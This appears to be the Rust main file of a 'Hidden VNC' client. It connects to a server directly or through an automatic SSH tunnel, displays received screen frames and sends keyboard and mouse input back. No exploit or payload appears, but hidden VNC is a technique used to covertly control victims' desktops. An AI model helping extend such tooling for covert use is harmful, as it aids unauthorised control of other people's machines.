//! Hidden VNC Client Binary
//! 
//! Main entry point for the Hidden VNC client application

use hidden_vnc::{
    common::{ClientConfig, constants::DEFAULT_PORT},
    client::*,
    Result, HvncError,
};
use image::GenericImageView;
use std::env;
use std::process;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use log::{info, warn, error, debug};
use tokio::signal;
use tokio::time::{Duration, interval};
use clap::{Arg, Command};

/// Application configuration
#[derive(Debug, Clone)]
struct AppConfig {
    pub client_config: ClientConfig,
    pub verbose: bool,
    pub fullscreen: bool,
    pub scale_factor: f32,
    pub mouse_sensitivity: f32,
    pub connection_timeout: Duration,
    pub retry_attempts: u32,
}

impl Default for AppConfig {
    fn default() -> Self {
        Self {
            client_config: ClientConfig::default(),
            verbose: false,
            fullscreen: false,
            scale_factor: 1.0,
            mouse_sensitivity: 1.0,
            connection_timeout: Duration::from_secs(10),
            retry_attempts: 3,
        }
    }
}

/// Client application state
struct ClientApp {
    network_client: NetworkClient,
    display_manager: DisplayManager,
    input_capture: InputCapture,
    config: AppConfig,
    shutdown_signal: Arc<AtomicBool>,
    frame_count: u64,
    last_frame_time: std::time::Instant,
}

impl ClientApp {
    fn new(config: AppConfig, shutdown_signal: Arc<AtomicBool>) -> Self {
        let network_client = NetworkClient::new_with_config(
            config.connection_timeout,
            config.retry_attempts,
            Duration::from_secs(2),
        );
        
        let display_manager = DisplayManager::new_with_settings(
            config.client_config.clone(),
            config.scale_factor,
            true, // maintain aspect ratio
        );
        
        let input_capture = InputCapture::new_with_settings(config.mouse_sensitivity);
        
        Self {
            network_client,
            display_manager,
            input_capture,
            config,
            shutdown_signal,
            frame_count: 0,
            last_frame_time: std::time::Instant::now(),
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    // Parse command line arguments
    let config = parse_arguments()?;
    
    // Initialize logging based on verbosity
    init_logging(config.verbose);
    
    info!("Starting Hidden VNC Client v0.1.0");
    info!("Configuration: {:?}", config);
    
    // Set up signal handling for graceful shutdown
    let shutdown_signal = Arc::new(AtomicBool::new(false));
    let shutdown_signal_clone = Arc::clone(&shutdown_signal);
    
    tokio::spawn(async move {
        match signal::ctrl_c().await {
            Ok(()) => {
                info!("Received Ctrl+C, initiating graceful shutdown...");
                shutdown_signal_clone.store(true, Ordering::Relaxed);
            }
            Err(err) => {
                error!("Failed to listen for shutdown signal: {}", err);
            }
        }
    });
    
    // Run the client
    match run_client(config, shutdown_signal).await {
        Ok(()) => {
            info!("Hidden VNC Client shut down successfully");
            Ok(())
        }
        Err(e) => {
            error!("Client error: {}", e);
            process::exit(1);
        }
    }
}

/// Parse command line arguments
fn parse_arguments() -> Result<AppConfig> {
    let matches = Command::new("hvnc-client")
        .version("0.1.0")
        .author("Hidden VNC Team")
        .about("Hidden Virtual Network Computing Client")
        .arg(
            Arg::new("server")
                .help("Server address to connect to (e.g., 127.0.0.1:5900) or 'auto' for automatic SSH tunnel")
                .index(1)
                .default_value("auto")
        )
        .arg(
            Arg::new("interactive")
                .short('i')
                .long("interactive")
                .help("Interactive connection setup mode")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("title")
                .short('t')
                .long("title")
                .value_name("TITLE")
                .help("Window title")
                .default_value("Hidden VNC Client")
        )
        .arg(
            Arg::new("scale")
                .short('s')
                .long("scale")
                .value_name("SCALE")
                .help("Display scale factor (0.1-4.0)")
                .default_value("1.0")
        )
        .arg(
            Arg::new("mouse-sensitivity")
                .short('m')
                .long("mouse-sensitivity")
                .value_name("SENSITIVITY")
                .help("Mouse sensitivity (0.1-5.0)")
                .default_value("1.0")
        )
        .arg(
            Arg::new("timeout")
                .long("timeout")
                .value_name("SECONDS")
                .help("Connection timeout in seconds")
                .default_value("10")
        )
        .arg(
            Arg::new("retries")
                .short('r')
                .long("retries")
                .value_name("COUNT")
                .help("Connection retry attempts")
                .default_value("3")
        )
        .arg(
            Arg::new("no-resize")
                .long("no-resize")
                .help("Disable automatic window resizing")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("fullscreen")
                .short('f')
                .long("fullscreen")
                .help("Start in fullscreen mode")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("verbose")
                .short('v')
                .long("verbose")
                .help("Enable verbose logging")
                .action(clap::ArgAction::SetTrue)
        )
        .get_matches();
    
    // Parse and validate arguments
    let mut server_address = matches.get_one::<String>("server").unwrap().clone();
    let interactive_mode = matches.get_flag("interactive");
    let window_title = matches.get_one::<String>("title").unwrap().clone();
    
    // Handle interactive mode
    if interactive_mode {
        server_address = "auto".to_string();
    }
    
    let scale_factor: f32 = matches.get_one::<String>("scale")
        .unwrap()
        .parse()
        .map_err(|_| HvncError::Connection("Invalid scale factor".to_string()))?;
    
    if scale_factor < 0.1 || scale_factor > 4.0 {
        return Err(HvncError::Connection("Scale factor must be between 0.1 and 4.0".to_string()));
    }
    
    let mouse_sensitivity: f32 = matches.get_one::<String>("mouse-sensitivity")
        .unwrap()
        .parse()
        .map_err(|_| HvncError::Connection("Invalid mouse sensitivity".to_string()))?;
    
    if mouse_sensitivity < 0.1 || mouse_sensitivity > 5.0 {
        return Err(HvncError::Connection("Mouse sensitivity must be between 0.1 and 5.0".to_string()));
    }
    
    let timeout_secs: u64 = matches.get_one::<String>("timeout")
        .unwrap()
        .parse()
        .map_err(|_| HvncError::Connection("Invalid timeout value".to_string()))?;
    
    let retry_attempts: u32 = matches.get_one::<String>("retries")
        .unwrap()
        .parse()
        .map_err(|_| HvncError::Connection("Invalid retry count".to_string()))?;
    
    let auto_resize = !matches.get_flag("no-resize");
    let fullscreen = matches.get_flag("fullscreen");
    let verbose = matches.get_flag("verbose");
    
    let client_config = ClientConfig {
        server_address,
        window_title,
        auto_resize,
    };
    
    Ok(AppConfig {
        client_config,
        verbose,
        fullscreen,
        scale_factor,
        mouse_sensitivity,
        connection_timeout: Duration::from_secs(timeout_secs),
        retry_attempts,
    })
}

/// Initialize logging based on verbosity level
fn init_logging(verbose: bool) {
    let log_level = if verbose {
        "debug"
    } else {
        "info"
    };
    
    env::set_var("RUST_LOG", format!("hvnc_client={},hidden_vnc={}", log_level, log_level));
    env_logger::init();
}

/// Main client execution logic
async fn run_client(config: AppConfig, shutdown_signal: Arc<AtomicBool>) -> Result<()> {
    let mut app = ClientApp::new(config, shutdown_signal);
    
    // Auto-connect with SSH tunnel if needed
    let server_address = if app.config.client_config.server_address == "auto" {
        // Auto-connect mode
        info!("Auto-connect mode enabled");
        
        // Try to load connection info from multiple sources
        let connection_info = if let Ok(info) = load_connection_info_from_file("hvnc_connection_info.txt") {
            info!("Loaded connection info from hvnc_connection_info.txt");
            info
        } else {
            // Try to load from config file, then use defaults
            let info = hidden_vnc::common::load_connection_info_with_config(None);
            info!("Using server configuration: {}", info.host);
            info
        };
        
        // Establish auto-connection
        let mut auto_connect = AutoConnect::new(connection_info);
        let tunnel_endpoint = auto_connect.auto_connect()?;
        
        // Store auto_connect for cleanup (we'll need to modify ClientApp to hold this)
        info!("Auto-connection established: {}", tunnel_endpoint);
        tunnel_endpoint
    } else {
        // Direct connection mode
        app.config.client_config.server_address.clone()
    };
    
    // Test connection first
    info!("Testing connection to server: {}", server_address);
    NetworkClient::test_connection(&server_address).await?;
    info!("Connection test successful");
    
    // Connect to server
    info!("Connecting to server...");
    app.network_client.connect(&server_address).await?;
    info!("Connected to server successfully");
    
    // Main client loop
    app.run_main_loop().await
}

impl ClientApp {
    /// Main client event loop
    async fn run_main_loop(&mut self) -> Result<()> {
        let mut frame_interval = interval(Duration::from_millis(33)); // ~30 FPS
        let mut input_interval = interval(Duration::from_millis(16)); // ~60 Hz input polling
        let mut stats_interval = interval(Duration::from_secs(10)); // Stats every 10 seconds
        
        let mut window_created = false;
        let mut connection_errors = 0;
        const MAX_CONNECTION_ERRORS: u32 = 5;
        
        loop {
            // Check for shutdown signal
            if self.shutdown_signal.load(Ordering::Relaxed) {
                info!("Shutdown signal received");
                break;
            }
            
            tokio::select! {
                // Handle frame reception
                _ = frame_interval.tick() => {
                    match self.handle_frame_reception().await {
                        Ok(frame_received) => {
                            if frame_received && !window_created {
                                window_created = true;
                                info!("Display window created");
                            }
                            connection_errors = 0; // Reset error count on success
                        }
                        Err(e) => {
                            connection_errors += 1;
                            warn!("Frame reception error ({}): {}", connection_errors, e);
                            
                            if connection_errors >= MAX_CONNECTION_ERRORS {
                                error!("Too many connection errors, attempting reconnection");
                                if let Err(reconnect_err) = self.attempt_reconnection().await {
                                    error!("Reconnection failed: {}", reconnect_err);
                                    return Err(reconnect_err);
                                }
                                connection_errors = 0;
                            }
                        }
                    }
                }
                
                // Handle input capture and sending
                _ = input_interval.tick() => {
                    if window_created {
                        if let Err(e) = self.handle_input_processing().await {
                            warn!("Input processing error: {}", e);
                        }
                    }
                }
                
                // Handle window events
                _ = tokio::time::sleep(Duration::from_millis(16)) => {
                    if window_created {
                        if self.display_manager.process_events() {
                            info!("Window close requested by user");
                            break;
                        }
                    }
                }
                
                // Periodic statistics
                _ = stats_interval.tick() => {
                    self.log_statistics();
                }
            }
        }
        
        info!("Client main loop completed");
        Ok(())
    }
    
    /// Handle frame reception from server
    async fn handle_frame_reception(&mut self) -> Result<bool> {
        match self.network_client.receive_frame().await {
            Ok(frame_data) => {
                debug!("Received frame: {} bytes", frame_data.len());
                
                // Create window if not exists (get dimensions from first frame)
                if !self.display_manager.is_open() {
                    // Try to decode the frame to get dimensions
                    match image::load_from_memory_with_format(&frame_data, image::ImageFormat::Jpeg) {
                        Ok(img) => {
                            let (width, height) = img.dimensions();
                            info!("Creating display window: {}x{}", width, height);
                            self.display_manager.create_window(width as usize, height as usize)?;
                            
                            // Update input coordinate scaling with VERBOSE logging
                            let client_size = (width as usize, height as usize);
                            let server_size = (width, height);
                            
                            info!("🎯 HVNC Input Setup: Client={}x{}, Server={}x{}", 
                                  client_size.0, client_size.1, server_size.0, server_size.1);
                            
                            self.input_capture.update_coordinate_scale(client_size, server_size);
                            
                            info!("✅ HVNC Input coordinate system initialized successfully");
                        }
                        Err(e) => {
                            warn!("Failed to decode initial frame for window creation: {}", e);
                            return Ok(false);
                        }
                    }
                }
                
                // Update display
                self.display_manager.update_display(&frame_data)?;
                
                // Update statistics
                self.frame_count += 1;
                self.last_frame_time = std::time::Instant::now();
                
                Ok(true)
            }
            Err(e) => {
                debug!("No frame received: {}", e);
                Ok(false)
            }
        }
    }
    
    /// Handle input processing and sending
    async fn handle_input_processing(&mut self) -> Result<()> {
        if let Some(window) = self.display_manager.get_window() {
            let input_events = self.input_capture.capture_events(window);
            
            if !input_events.is_empty() {
                info!("🎮 HVNC Client Input: Captured {} input events", input_events.len());
            }
            
            for event in input_events {
                info!("🚀 HVNC Client Input: Sending input event: {:?}", event);
                match self.network_client.send_input(event).await {
                    Ok(()) => {
                        debug!("✅ HVNC Client Input: Event sent successfully");
                    }
                    Err(e) => {
                        error!("❌ HVNC Client Input: Failed to send input event: {}", e);
                        return Err(e);
                    }
                }
            }
        } else {
            debug!("⚠️ HVNC Client Input: No window available for input capture");
        }
        
        Ok(())
    }
    
    /// Attempt to reconnect to the server
    async fn attempt_reconnection(&mut self) -> Result<()> {
        warn!("Attempting to reconnect to server");
        
        // Close display window
        self.display_manager.close();
        
        // Reset input state
        self.input_capture.reset_state();
        
        // Attempt reconnection
        self.network_client.reconnect().await?;
        
        info!("Reconnection successful");
        Ok(())
    }
    
    /// Log client statistics
    fn log_statistics(&self) {
        let elapsed = self.last_frame_time.elapsed();
        let fps = if elapsed.as_secs() > 0 {
            self.frame_count as f64 / elapsed.as_secs_f64()
        } else {
            0.0
        };
        
        let display_stats = self.display_manager.get_display_stats();
        let input_stats = self.input_capture.get_input_stats();
        let connection_stats = self.network_client.get_connection_stats();
        
        info!("Client Statistics:");
        info!("  Frames received: {} (avg {:.1} FPS)", self.frame_count, fps);
        info!("  Display: {}x{}, open: {}", 
              display_stats.current_size.0, display_stats.current_size.1, display_stats.is_open);
        info!("  Input: {} keys, {} mouse buttons pressed", 
              input_stats.pressed_keys_count, input_stats.pressed_mouse_buttons_count);
        info!("  Connection: {}, server: {}", 
              if connection_stats.is_connected { "connected" } else { "disconnected" },
              connection_stats.server_address);
    }
}

impl Drop for ClientApp {
    fn drop(&mut self) {
        info!("Client application shutting down");
        // Cleanup is handled by individual component Drop implementations
    }
}